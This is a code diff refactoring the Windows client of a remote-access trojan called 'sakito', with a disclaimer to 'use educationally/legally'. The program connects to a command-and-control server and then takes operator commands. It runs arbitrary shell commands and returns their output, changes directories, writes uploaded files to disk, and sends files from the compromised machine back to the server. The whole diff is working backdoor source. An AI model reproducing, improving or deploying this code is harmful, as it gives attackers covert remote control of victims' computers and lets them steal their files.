@@ -3,10 +3,8 @@ Coded by d4rkstat1c.
 Use educationally/legally.
 */
 #include <ws2tcpip.h>
-#include <stdio.h>
-#include <stdlib.h>
 #include <stdint.h>
-#include "sakito_tools.h"
+#include "sakito_core.h"
 
 #define HOST "127.0.0.1"
 #define PORT 4443
@@ -23,11 +21,10 @@ const SOCKET create_socket() {
 		return INVALID_SOCKET;
 
 	// Create socket and hint structure
-	const SOCKET connect_socket = socket(AF_INET, SOCK_STREAM, 0);
-	if (connect_socket == INVALID_SOCKET) {
+	const SOCKET connect_socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+	//const SOCKET connect_socket = socket(AF_INET, SOCK_STREAM, 0);
+	if (connect_socket == INVALID_SOCKET)
 		WSACleanup();
-		return connect_socket;
-	}
 
 	return connect_socket;
 }
@@ -48,114 +45,50 @@ int c2_connect(const SOCKET connect_socket) {
 	return 1;
 }
 
+// Function to execute command.
+BOOL exec_cmd(const SOCKET connect_socket, char* const buf) {
+	BOOL i_result = sakito_win_cp(connect_socket, buf);
+
+    if (send(connect_socket, "\x11\x13\xcf", 3, 0) < 1)
+    	return SOCKET_ERROR;
+
+	return i_result;
+}
+
 // Function to receive file from client (TCP file transfer).
-int recv_file(char* const buf, const char* filename, const SOCKET connect_socket) {
-	FILE* fd = fopen(filename, "wb");
+int send_file(const SOCKET connect_socket, char* const buf) {
+	int32_t f_size = -1;
+
+	// Open file with read permissions.
+	HANDLE h_file = sakito_win_openf(buf+1, GENERIC_READ, OPEN_EXISTING);
+
+	// If File Exists.
+	if (h_file != INVALID_HANDLE_VALUE) {
+	   	// Get file size and serialize file size bytes.
+		LARGE_INTEGER largeint_struct;
+		GetFileSizeEx(h_file, &largeint_struct);
+		f_size = (int32_t)largeint_struct.QuadPart;
+	}
+
+	return sakito_win_sendf(h_file, connect_socket, buf, f_size);
+}
+
+// Function to receive file from client (TCP file transfer).
+int recv_file(const SOCKET connect_socket, char* const buf) {
+	HANDLE h_file = sakito_win_openf(buf+1, GENERIC_WRITE, CREATE_ALWAYS);
 
 	// Receive file size.
-	if (recv(connect_socket, buf, sizeof(uint32_t), 0) < 1)
+	if (recv(connect_socket, buf, sizeof(int32_t), 0) < 1)
 		return SOCKET_ERROR;
 
-	// Serialize f_size.
-	uint32_t f_size = ntohl_conv(&*(buf));
+	// Deserialize f_size.
+	int32_t f_size = ntohl_conv(&*(buf));
 
-	// Receive all file bytes/chunks and write to parsed filename.
-	int i_result = 1;
-	long int total = 0;
+	if (f_size > 0)
+		// Windows TCP file transfer (recv) function located in sakito_tools.h.
+		int i_result = sakito_win_recvf(h_file, connect_socket, buf, f_size);
 
-	while (total != f_size && i_result > 0) {
-		i_result = recv(connect_socket, buf, BUFLEN, 0);
-		fwrite(buf, 1, i_result, fd);
-		total += i_result;
-	}
-
-	fclose(fd);
-
-	return i_result;
-}
-
-// Function for sending file to client (TCP file transfer).
-int send_file(const char* filename, const SOCKET connect_socket, char* const buf) {
-	// Open file.
-	FILE* fd = fopen(filename, "rb");
-	uint32_t bytes = 0, f_size = 0;
-
-	if (fd) {
-		// Calculate file size.
-		fseek(fd, 0L, SEEK_END);
-		f_size = ftell(fd);
-
-		// Serialize f_size.
-		bytes = htonl(f_size);
-		fseek(fd, 0L, SEEK_SET);
-	}
-
-	if (send(connect_socket, (char*)&bytes, sizeof(bytes), 0) < 1)
-		return SOCKET_ERROR;
-
-	int i_result = 1;
-
-	// Recursively read file until EOF is detected and send file bytes to c2 server in BUFLEN chunks.
-	if (f_size) {
-		int bytes_read;
-		while (!feof(fd) && i_result > 0) {
-			// Recursively read file until end of file (EOF).
-			if (bytes_read = fread(buf, 1, BUFLEN, fd))
-				// Send read bytes chunk to c2 server.
-				i_result = send(connect_socket, buf, bytes_read, 0);
-			else
-				break;
-		}
-		// Close the file.
-		fclose(fd);
-	}
-
-	return i_result;
-}
-
-// Function to execute command.
-int exec_cmd(const SOCKET connect_socket, char* const buf) {
-	// Call Popen to execute command(s) and read the process' output.
-	strcat(buf, " 2>&1");
-
-	FILE* fpipe = _popen(buf, "r");
-	int bytes_read;
-
-	if ((bytes_read = fread(buf, 1, BUFLEN, fpipe)) == 0) {
-		bytes_read = 1;
-		buf[0] = '\0';
-	}
-
-	uint32_t s_size = bytes_read;
-
-	const int chunk = 24576;
-	int capacity = chunk;
-	char* output = malloc(capacity);
-	strcpy(output, buf);
-
-	// Read and store pipe's stdout in output.
-	while (1) {
-		if ((bytes_read = fread(buf, 1, BUFLEN, fpipe)) == 0)
-			break;
-		// If output has reached maximum capacity in memory size.
-		if ((s_size += bytes_read) == capacity)
-			output = realloc(output, (capacity += chunk));
-
-		strcat(output, buf);
-	}
-
-	// Serialize s_size.
-	uint32_t bytes = htonl(s_size);
-
-	// Send serialized bytes.
-	if (send(connect_socket, (char*)&bytes, sizeof(uint32_t), 0) < 1)
-		return SOCKET_ERROR;
-
-	int i_result = send(connect_socket, output, s_size, 0);
-	free(output);
-
-	// Close the pipe stream.
-	_pclose(fpipe);
+	CloseHandle(h_file);
 
 	return i_result;
 }
@@ -167,36 +100,36 @@ int main(void) {
 		const SOCKET connect_socket = create_socket();
 
 		/* If connected to c2 recursively loop to receive/parse c2 commands. If an error-
-	           occurs (connection lost, etc) break the loop and reconnect & restart loop. The switch-
+	       occurs (connection lost, etc) break the loop and reconnect & restart loop. The switch-
 		   statement will parse & execute functions based on the order of probability.*/
 		if (connect_socket != INVALID_SOCKET) {
 			int i_result = c2_connect(connect_socket);
 			while (i_result > 0) {
-				// BUFLEN + 1 + 4, for null byte and "2>&1" string concatenation
-				char buf[BUFLEN + 5] = { 0 };
+				// 8192 == Max command line command length in windows + 1 for null termination.
+				char buf[BUFLEN + 1] = { 0 };
 
 				if (recv(connect_socket, buf, BUFLEN, 0) < 1)
 					break;
 
-				// buf[0] is the command code and &buf[1] is the parsed data.
+				// buf[0] is the command code and buf+1 is pointing to the parsed data.
 				switch (buf[0]) {
 					case '0':
-						i_result = exec_cmd(connect_socket, &buf[1]);
+						i_result = exec_cmd(connect_socket, buf+1);
 						break;
 					case '1':
 						// Change directory.
-						_chdir(&buf[1]);
+						_chdir(buf+1);
 						break;
 					case '2':
 						// Exit.
 						return 0;
 					case '3':
 						// Upload file to client system.
-						i_result = recv_file(buf, &buf[1], connect_socket);
+						i_result = recv_file(connect_socket, buf);
 						break;
 					case '4':
 						// Download file from client system.
-						i_result = send_file(&buf[1], connect_socket, buf);
+						i_result = send_file(connect_socket, buf);
 						break;
 				}
 			}
